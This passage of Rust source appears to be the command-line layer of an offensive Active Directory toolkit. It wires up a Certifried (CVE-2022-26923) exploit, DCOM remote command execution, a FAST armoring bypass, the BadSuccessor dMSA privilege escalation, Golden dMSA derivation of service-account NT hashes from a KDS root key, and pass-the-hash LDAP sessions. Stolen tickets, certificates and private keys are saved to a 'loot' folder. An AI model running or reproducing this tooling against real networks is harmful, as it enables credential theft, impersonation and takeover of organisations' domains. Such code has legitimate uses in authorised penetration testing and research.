                        "result_code": r.result_code,
                    }),
                );
            }

            if r.success {
                println!(
                    "{} Password {} succeeded: {}",
                    "[+]".green(),
                    if reset { "reset" } else { "change" },
                    r.message.cyan()
                );
                banner::print_success("kpasswd completed");
                0
            } else {
                banner::print_fail(&format!("kpasswd failed: {}", r.message));
                1
            }
        }
        Err(e) => {
            banner::print_fail(&format!("kpasswd failed: {e}"));
            1
        }
    }
}

// ----------------------------------------------
// cmd_describe_ticket -- parse KIRBI/ccache
// ----------------------------------------------

pub async fn cmd_describe_ticket(cli: &Cli, file: &str) -> i32 {
    banner::print_module_banner("DESCRIBE TICKET");

    let bytes = match std::fs::read(file) {
        Ok(b) => b,
        Err(e) => {
            banner::print_fail(&format!("Failed to read ticket file: {e}"));
            return 1;
        }
    };

    let description =
        if bytes.starts_with(b"\x76\xff\xff\xff") || bytes.starts_with(b"\x76\x01\x00\x00") {
            // Microsoft KIRBI format starts with 0x76 (APPLICATION 10 TAG)
            format!("KIRBI file: {} bytes", bytes.len())
        } else if bytes.starts_with(b"krb5cc-") || bytes.starts_with(b"krb5cc_") {
            format!("ccache file: {} bytes", bytes.len())
        } else {
            format!("Unknown ticket format: {} bytes", bytes.len())
        };

    if wants_json(cli) {
        return emit_json(
            cli,
            serde_json::json!({
                "status": "success",
                "file": file,
                "size": bytes.len(),
                "description": description,
                "hex_header": hex::encode(&bytes[..bytes.len().min(16)]),
            }),
        );
    }

    println!("{} {}", "[+]".green(), file.cyan());
    println!("{} {}", ">".bright_black(), description);
    println!(
        "{} Header: {}",
        ">".bright_black(),
        hex::encode(&bytes[..bytes.len().min(16)])
    );
    banner::print_success("Ticket described");
    0
}

// ----------------------------------------------
// cmd_certifried -- CVE-2022-26923
// ----------------------------------------------

pub async fn cmd_certifried(
    cli: &Cli,
    ca_url: &str,
    target_dc_fqdn: &str,
    computer_name: Option<&str>,
    computer_password: Option<&str>,
    template: &str,
    cleanup: bool,
) -> i32 {
    banner::print_module_banner("CERTIFRIED");
    let creds = match crate::require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let dc = match crate::require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };
    let domain = match cli.domain.as_deref() {
        Some(d) => d.to_string(),
        None => {
            banner::print_fail("--domain is required for Certifried");
            return 1;
        }
    };

    let mut ldap = match connect_ldap_session(&dc, &domain, &creds).await {
        Ok(l) => l,
        Err(e) => return e,
    };

    let config = CertifriedConfig {
        ca_url: ca_url.to_string(),
        domain,
        dc_ip: dc,
        username: creds.username.clone(),
        password: creds.password().unwrap_or("").to_string(),
        target_dc_fqdn: target_dc_fqdn.to_string(),
        computer_name: computer_name.map(|s| s.to_string()),
        computer_password: computer_password.map(|s| s.to_string()),
        template: template.to_string(),
        cleanup,
    };

    println!(
        " {} Target DC: {} via CA {}",
        ">".bright_black(),
        target_dc_fqdn.cyan(),
        ca_url.cyan()
    );

    match exploit_certifried_core(&mut ldap, &config).await {
        Ok(result) => {
            if wants_json(cli) {
                return emit_json(
                    cli,
                    serde_json::json!({
                        "status": "success",
                        "computer_name": result.computer_name,
                        "original_dns_hostname": result.original_dns_hostname,
                        "has_certificate": result.certificate.is_some(),
                        "has_kirbi": result.kirbi.is_some(),
                        "message": result.message,
                    }),
                );
            }

            println!(
                "{} Certifried succeeded: {}",
                "[+]".green(),
                result.message.cyan()
            );
            if let Some(ref kirbi) = result.kirbi {
                let loot_dir = std::path::PathBuf::from("./loot");
                let _ = std::fs::create_dir_all(&loot_dir);
                let path = loot_dir.join("certifried_tgt.kirbi");
                if std::fs::write(&path, kirbi).is_ok() {
                    println!("{} Saved TGT to {}", "->".cyan(), path.display());
                }
            }
            banner::print_success("Certifried exploit completed");
            0
        }
        Err(e) => {
            banner::print_fail(&format!("Certifried failed: {e}"));
            1
        }
    }
}

// ----------------------------------------------
// cmd_dcomexec -- DCOM lateral movement
// ----------------------------------------------

pub async fn cmd_dcomexec(
    cli: &Cli,
    target: &str,
    command: &str,
    arguments: &str,
    method: DcomExecMethod,
    timeout_ms: u64,
) -> i32 {
    banner::print_module_banner("DCOMEXEC");

    let core_method = match method {
        DcomExecMethod::Mmc20Application => CoreDcomExecMethod::Mmc20Application,
        DcomExecMethod::ShellWindows => CoreDcomExecMethod::ShellWindows,
        DcomExecMethod::ShellBrowserWindow => CoreDcomExecMethod::ShellBrowserWindow,
    };

    let config = CoreDcomExecConfig {
        target: target.to_string(),
        command: command.to_string(),
        arguments: arguments.to_string(),
        method: core_method,
        username: None,
        password: None,
        domain: None,
        timeout_ms,
    };

    println!(
        " {} {} on {} via {:?}",
        ">".bright_black(),
        command.yellow(),
        target.cyan(),
        method
    );

    match dcom_exec(&config).await {
        Ok(result) => {
            if wants_json(cli) {
                return emit_json(
                    cli,
                    serde_json::json!({
                        "status": if result.success { "success" } else { "failure" },
                        "target": result.target,
                        "command": result.command,
                        "method": result.method,
                        "message": result.message,
                    }),
                );
            }

            if result.success {
                println!("{} {}", "[+]".green(), result.message.cyan());
                banner::print_success("DCOMexec completed");
                0
            } else {
                banner::print_fail(&result.message);
                1
            }
        }
        Err(e) => {
            banner::print_fail(&format!("DCOMexec failed: {e}"));
            1
        }
    }
}

// ----------------------------------------------
// cmd_as_req_st -- AS-Requested Service Ticket
// ----------------------------------------------

pub async fn cmd_as_req_st(
    cli: &Cli,
    dc: &str,
    spn: &str,
    creds: &Credentials,
    use_hash: bool,
    secret: &str,
) -> Result<(), String> {
    use overthrone_core::cred_cache::CredCache;
    use overthrone_core::proto::kerberos;

    let domain = creds.domain.clone();
    info!(
        "AS-REQ ST: requesting {spn} via AS-REQ path for {}@{}",
        creds.username, domain
    );

    let st = kerberos::request_service_ticket_via_as_req(dc, &domain, spn, secret, use_hash)
        .await
        .map_err(|e| format!("AS-Requested ST failed: {e}"))?;

    if wants_json(cli) {
        return Ok(());
    }

    println!(
        "{} Service ticket obtained via AS-REQ: {}@{}",
        "[+]".green(),
        spn.cyan(),
        domain.cyan()
    );

    let loot_dir = std::path::PathBuf::from("./loot");
    let _ = std::fs::create_dir_all(&loot_dir);
    let kirbi_path = loot_dir.join(format!("as_req_st_{}.kirbi", spn.replace(['/', ':'], "_")));
    let kirbi_bytes = kerberos::tgd_to_kirbi(&st);
    if std::fs::write(&kirbi_path, &kirbi_bytes).is_ok() {
        println!("{} Saved to {}", "->".cyan(), kirbi_path.display());
    }

    let cache = CredCache::new();
    let _ = cache.save_tgt(&st);

    Ok(())
}

// ----------------------------------------------
// cmd_breakfast -- FAST armoring bypass
// ----------------------------------------------

pub async fn cmd_breakfast(
    cli: &Cli,
    dc: &str,
    target: &str,
    machine_name: Option<&str>,
    machine_hash: Option<&str>,
) -> i32 {
    use overthrone_core::proto::breakfast::{BreakFastConfig, breakfast_request_tgt};

    let creds = match crate::require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };

    let machine_name = match machine_name {
        Some(n) => n.to_string(),
        None => {
            banner::print_fail("--machine-name is required for BreakFAST");
            return 1;
        }
    };
    let machine_nt_hash = match machine_hash {
        Some(h) => h.to_string(),
        None => {
            banner::print_fail("--machine-hash is required for BreakFAST");
            return 1;
        }
    };

    let config = BreakFastConfig {
        dc_ip: dc.to_string(),
        domain: creds.domain.clone(),
        machine_name,
        machine_nt_hash,
        target_user: target.to_string(),
        etypes: vec![18, 23],
    };

    match breakfast_request_tgt(&config).await {
        Ok(result) => {
            if wants_json(cli) {
                return emit_json(
                    cli,
                    serde_json::json!({
                        "status": "success",
                        "target_user": result.target_user,
                        "armor_account": result.armor_account,
                        "fast_used": result.fast_used,
                    }),
                );
            }

            println!(
                "{} BreakFAST succeeded: TGT obtained for {} via {}",
                "[+]".green(),
                result.target_user.cyan(),
                result.armor_account.cyan()
            );

            let loot_dir = std::path::PathBuf::from("./loot");
            let _ = std::fs::create_dir_all(&loot_dir);
            let kirbi_path = loot_dir.join("breakfast_tgt.kirbi");
            let kirbi_bytes = overthrone_core::proto::kerberos::tgd_to_kirbi(&result.tgt);
            if std::fs::write(&kirbi_path, &kirbi_bytes).is_ok() {
                println!("{} Saved to {}", "->".cyan(), kirbi_path.display());
            }

            banner::print_success("BreakFAST armored TGT obtained");
            0
        }
        Err(e) => {
            banner::print_fail(&format!("BreakFAST failed: {e}"));
            1
        }
    }
}

// ----------------------------------------------
// cmd_dmsa -- BadSuccessor + Golden dMSA
// ----------------------------------------------

pub async fn cmd_dmsa(cli: &Cli, action: &DmsaAction) -> i32 {
    banner::print_module_banner("DMSA");

    let creds = match crate::require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let dc = match crate::require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };

    match action {
        DmsaAction::BadSuccessor {
            target,
            domain,
            dmsa_name,
            dmsa_password,
            target_user_dn,
        } => {
            let domain = if domain.is_empty() {
                match cli.domain.as_deref() {
                    Some(d) => d.to_string(),
                    None => {
                        banner::print_fail("--domain is required for BadSuccessor");
                        return 1;
                    }
                }
            } else {
                domain.to_string()
            };

            let mut ldap = match connect_ldap_session(&dc, &domain, &creds).await {
                Ok(l) => l,
                Err(e) => return e,
            };

            let target_user_dn = match target_user_dn {
                Some(dn) => dn.clone(),
                None => {
                    banner::print_fail("--target-user-dn is required for BadSuccessor");
                    return 1;
                }
            };

            let target_sam = target_user_dn
                .split(',')
                .next()
                .and_then(|p| p.strip_prefix("CN="))
                .unwrap_or("target")
                .to_string();

            let config = overthrone_core::postex::BadSuccessorConfig {
                domain,
                dc_ip: dc.clone(),
                target_ou: format!(
                    "CN=Users,DC={}",
                    creds.domain.split('.').collect::<Vec<_>>().join(",DC=")
                ),
                target_user_dn,
                target_sam,
                dmsa_name: Some(dmsa_name.clone()),
                dmsa_password: Some(dmsa_password.clone()),
            };

            println!(
                " {} BadSuccessor exploit against {} via dMSA {}",
                ">".bright_black(),
                target.cyan(),
                dmsa_name.cyan()
            );

            match overthrone_core::postex::exploit_bad_successor(&mut ldap, &config).await {
                Ok(result) => {
                    if wants_json(cli) {
                        return emit_json(
                            cli,
                            serde_json::json!({
                                "status": "success",
                                "dmsa_dn": result.dmsa_dn,
                                "dmsa_sam": result.dmsa_sam,
                                "impersonated_user": result.impersonated_user,
                                "domain_sid": result.domain_sid,
                            }),
                        );
                    }

                    println!(
                        "{} Created dMSA {} and obtained TGT for {}",
                        "[+]".green(),
                        result.dmsa_sam.cyan(),
                        result.impersonated_user.cyan()
                    );
                    println!(
                        "{} Clean up with: ovt dmsa bad-successor --target <dc> --target-user-dn {}",
                        "!".yellow(),
                        result.dmsa_dn.dimmed()
                    );
                    banner::print_success("BadSuccessor exploit completed");
                    0
                }
                Err(e) => {
                    banner::print_fail(&format!("BadSuccessor failed: {e}"));
                    1
                }
            }
        }

        DmsaAction::Golden {
            kds_key_file,
            domain,
            target_dc,
            list_only,
            output,
        } => {
            let domain = domain
                .as_ref()
                .map(|d| d.to_string())
                .or_else(|| cli.domain.clone())
                .unwrap_or_default();
            if domain.is_empty() {
                banner::print_fail("--domain is required for Golden dMSA");
                return 1;
            }

            let kds_key = match kds_key_file {
                Some(path) => {
                    let bytes = match std::fs::read(path) {
                        Ok(b) => b,
                        Err(e) => {
                            banner::print_fail(&format!("Failed to read KDS key file: {e}"));
                            return 1;
                        }
                    };
                    match overthrone_core::postex::parse_kds_root_key(&bytes) {
                        Ok(k) => Some(k),
                        Err(e) => {
                            banner::print_fail(&format!("Failed to parse KDS key: {e}"));
                            return 1;
                        }
                    }
                }
                None => {
                    println!(
                        "{} No KDS key file provided; MSA enumeration only",
                        "!".yellow()
                    );
                    None
                }
            };

            if kds_key.is_none() && !list_only {
                banner::print_fail("--kds-key-file is required unless --list-only is set");
                return 1;
            }

            let dc_to_use = target_dc
                .as_ref()
                .map(|s| s.as_str())
                .unwrap_or(dc.as_str());
            let mut ldap = match connect_ldap_session(dc_to_use, &domain, &creds).await {
                Ok(l) => l,
                Err(e) => return e,
            };

            match overthrone_core::postex::enumerate_msas(&mut ldap).await {
                Ok(msas) => {
                    if msas.is_empty() {
                        println!(" {} No managed service accounts found", "!".yellow());
                        return 0;
                    }

                    println!(
                        "{} Found {} managed service account(s)",
                        "[+]".green(),
                        msas.len()
                    );

                    if *list_only {
                        if wants_json(cli) {
                            let msas_json: Vec<serde_json::Value> = msas
                                .iter()
                                .map(|m| {
                                    serde_json::json!({
                                        "sam_account_name": m.sam_account_name,
                                        "distinguished_name": m.distinguished_name,
                                    })
                                })
                                .collect();
                            return emit_json(
                                cli,
                                serde_json::json!({
                                    "status": "success",
                                    "total": msas.len(),
                                    "msas": msas_json,
                                }),
                            );
                        }

                        for msa in &msas {
                            println!(
                                " {} {} ({})",
                                "[+]".green(),
                                msa.sam_account_name.cyan(),
                                msa.distinguished_name.dimmed()
                            );
                        }
                        return 0;
                    }

                    let kds = match kds_key {
                        Some(k) => k,
                        None => {
                            banner::print_fail("KDS key required for password derivation");
                            return 1;
                        }
                    };

                    let result = overthrone_core::postex::generate_msa_passwords(&kds, &msas);
                    let passwords = result.msa_passwords;
                    let errors = result.errors;

                    if wants_json(cli) {
                        let pw_json: Vec<serde_json::Value> = passwords
                            .iter()
                            .map(|p| {
                                serde_json::json!({
                                    "sam_account_name": p.sam_account_name,
                                    "nt_hash": p.nt_hash,
                                    "is_current": p.is_current,
                                })
                            })
                            .collect();
                        return emit_json(
                            cli,
                            serde_json::json!({
                                "status": "success",
                                "total": passwords.len(),
                                "errors": errors,
                                "passwords": pw_json,
                            }),
                        );
                    }

                    for pw in &passwords {
                        println!(
                            "{} {} NT hash: {}",
                            "[+]".green(),
                            pw.sam_account_name.cyan(),
                            pw.nt_hash.yellow()
                        );
                    }
                    for err in &errors {
                        eprintln!("{} {}", "!".yellow(), err);
                    }

                    if let Some(path) = output {
                        let mut lines =
                            vec!["sam_account_name,nt_hash,password,is_current".to_string()];
                        for pw in &passwords {
                            lines.push(format!(
                                "{},{},{},{}",
                                pw.sam_account_name, pw.nt_hash, pw.password, pw.is_current
                            ));
                        }
                        if let Err(e) = std::fs::write(path, lines.join("\n")) {
                            eprintln!("warn: failed to write CSV '{}': {e}", path);
                        } else {
                            println!("{} Saved to {}", "->".cyan(), path);
                        }
                    }

                    if passwords.is_empty() && !errors.is_empty() {
                        banner::print_fail(&format!(
                            "Password derivation had {} error(s)",
                            errors.len()
                        ));
                        return 1;
                    }

                    banner::print_success(&format!(
                        "Derived {} gMSA/dMSA password(s)",
                        passwords.len()
                    ));
                    0
                }
                Err(e) => {
                    banner::print_fail(&format!("MSA enumeration failed: {e}"));
                    1
                }
            }
        }
    }
}

// ----------------------------------------------
// cmd_certighost -- CA chase fallback enrollment
// ----------------------------------------------

pub async fn cmd_certighost(
    cli: &Cli,
    ca_server: &str,
    ces_url: Option<&str>,
    template: &str,
    subject: Option<&str>,
    san: Option<&str>,
    dry_run: bool,
) -> i32 {
    banner::print_module_banner("CERTIGHOST");

    let ces_url = ces_url
        .map(|s| s.to_string())
        .unwrap_or_else(|| format!("https://{}/CES/", ca_server.trim_end_matches('/')));

    let config = overthrone_core::postex::CertighostConfig {
        ca_server: ca_server.to_string(),
        ces_url,
        use_proxy: false,
        proxy_url: None,
        template: template.to_string(),
        subject: subject.map(|s| s.to_string()),
        san: san.map(|s| s.to_string()),
        key_size: 2048,
        dry_run,
    };

    println!(
        " {} CA server: {} | template: {}",
        ">".bright_black(),
        ca_server.cyan(),
        template.cyan()
    );

    let config = config.clone();
    let result = match tokio::task::spawn_blocking(move || {
        overthrone_core::postex::certighost_auto_enroll(&config)
    })
    .await
    {
        Ok(r) => r,
        Err(e) => {
            banner::print_fail(&format!("Certighost task failed: {e}"));
            return 1;
        }
    };

    match result {
        Ok(r) => {
            if wants_json(cli) {
                return emit_json(
                    cli,
                    serde_json::json!({
                        "status": "success",
                        "subject": r.subject,
                        "issuer": r.issuer,
                        "template": r.template,
                        "thumbnail": r.thumbnail,
                        "message": r.message,
                    }),
                );
            }

            println!("{} {}", "[+]".green(), r);
            if let Some(ref cert) = r.certificate {
                let loot_dir = std::path::PathBuf::from("./loot");
                let _ = std::fs::create_dir_all(&loot_dir);
                let cert_path = loot_dir.join("certighost_cert.pem");
                if std::fs::write(&cert_path, cert).is_ok() {
                    println!(
                        "{} Saved certificate to {}",
                        "->".cyan(),
                        cert_path.display()
                    );
                }
            }
            if let Some(ref key) = r.private_key {
                let loot_dir = std::path::PathBuf::from("./loot");
                let _ = std::fs::create_dir_all(&loot_dir);
                let key_path = loot_dir.join("certighost_key.pem");
                if std::fs::write(&key_path, key).is_ok() {
                    println!(
                        "{} Saved private key to {}",
                        "->".cyan(),
                        key_path.display()
                    );
                }
            }
            banner::print_success("Certighost enrollment completed");
            0
        }
        Err(e) => {
            banner::print_fail(&format!("Certighost failed: {e}"));
            1
        }
    }
}

// ----------------------------------------------
// cmd_dirsync -- OBJECT_SECURITY DirSync enumeration
// ----------------------------------------------

pub async fn cmd_dirsync(
    cli: &Cli,
    base_dn: Option<&str>,
    include_sd: bool,
    page_size: u32,
    full: bool,
) -> i32 {
    banner::print_module_banner("DIRSYNC");

    let creds = match crate::require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let dc = match crate::require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };
    let domain = match cli.domain.as_deref() {
        Some(d) => d.to_string(),
        None => {
            banner::print_fail("--domain is required for DirSync");
            return 1;
        }
    };

    let base_dn = base_dn.map(|s| s.to_string()).unwrap_or_else(|| {
        let parts: Vec<&str> = domain.split('.').collect();
        format!("DC={}", parts.join(",DC="))
    });

    let mut ldap = match connect_ldap_session(&dc, &domain, &creds).await {
        Ok(l) => l,
        Err(e) => return e,
    };

    let raw = match ldap.raw_ldap() {
        Some(l) => l,
        None => {
            banner::print_fail(
                "DirSync requires the standard LDAP connection (not pass-the-hash raw mode)",
            );
            return 1;
        }
    };

    let config = overthrone_core::postex::DirSyncConfig {
        base_dn,
        cookie: Vec::new(),
        page_size,
        attributes: vec!["*".into(), "nTSecurityDescriptor".into()],
        object_class: vec!["user".into(), "computer".into(), "group".into()],
        include_sd,
    };

    let result = if full {
        overthrone_core::postex::dirsync_full_sync(raw, &config).await
    } else {
        overthrone_core::postex::dirsync_enum(raw, &config).await
    };

    match result {
        Ok(r) => {
            if wants_json(cli) {
                let entries_json: Vec<serde_json::Value> = r
                    .entries
                    .iter()
                    .map(|e| {
                        serde_json::json!({
                            "dn": e.dn,
                            "object_class": e.object_class,
                            "object_guid": e.object_guid,
                            "has_sd": e.security_descriptor.is_some(),
                        })
                    })
                    .collect();
                return emit_json(
                    cli,
                    serde_json::json!({
                        "status": "success",
                        "total": r.total_count,
                        "more_data": r.more_data,
                        "cookie_len": r.cookie.len(),
                        "elapsed_seconds": r.elapsed_seconds,
                        "entries": entries_json,
                    }),
                );
            }

            println!("{}", r);
            println!(
                "{} Found {} entries (more_data: {})",
                "[+]".green(),
                r.total_count,
                r.more_data
            );
            for e in &r.entries[..r.entries.len().min(10)] {
                println!("  {}", e);
            }
            if r.entries.len() > 10 {
                println!("  ... and {} more", r.entries.len() - 10);
            }
            banner::print_success("DirSync enumeration completed");
            0
        }
        Err(e) => {
            banner::print_fail(&format!("DirSync failed: {e}"));
            1
        }
    }
}

async fn connect_ldap_session(
    dc: &str,
    domain: &str,
    creds: &Credentials,
) -> std::result::Result<overthrone_core::proto::ldap::LdapSession, i32> {
    if let Some(hash) = creds.nthash() {
        match overthrone_core::proto::ldap::LdapSession::connect_with_hash(
            dc,
            domain,
            &creds.username,
            hash,
            false,
        )
        .await
        {
            Ok(s) => Ok(s),
            Err(e) => {
                banner::print_fail(&format!("LDAP connect failed: {e}"));
                Err(1)
            }
        }
    } else {
        match overthrone_core::proto::ldap::LdapSession::connect(
            dc,
            domain,
            &creds.username,
            creds.password().unwrap_or(""),
            false,
        )
        .await
        {
            Ok(s) => Ok(s),
            Err(e) => {
                banner::print_fail(&format!("LDAP connect failed: {e}"));
                Err(1)
            }
        }
    }
}

/// Request a TGT with cache-first logic, using opsec options.
#[allow(dead_code)]
pub async fn get_cached_tgt_opsec(
    dc: &str,
    domain: &str,
    username: &str,
    secret: &str,
    use_hash: bool,
    refresh: bool,
    options: &overthrone_core::proto::kerberos::RequestTgtOptions,
) -> Result<overthrone_core::proto::kerberos::TicketGrantingData, String> {
    let cache = overthrone_core::cred_cache::CredCache::new();

    if !refresh && let Some(tgt) = cache.load_tgt(domain, username) {
        debug!("Using cached TGT for {username}@{domain}");
        return Ok(tgt);
    }

    let tgt = overthrone_core::proto::kerberos::request_tgt_opsec(
        dc, domain, username, secret, use_hash, options,
    )
    .await
    .map_err(|e| format!("TGT request failed: {e}"))?;

    if let Err(e) = cache.save_tgt(&tgt) {
        debug!("Failed to cache TGT: {e}");
    }

    Ok(tgt)
}
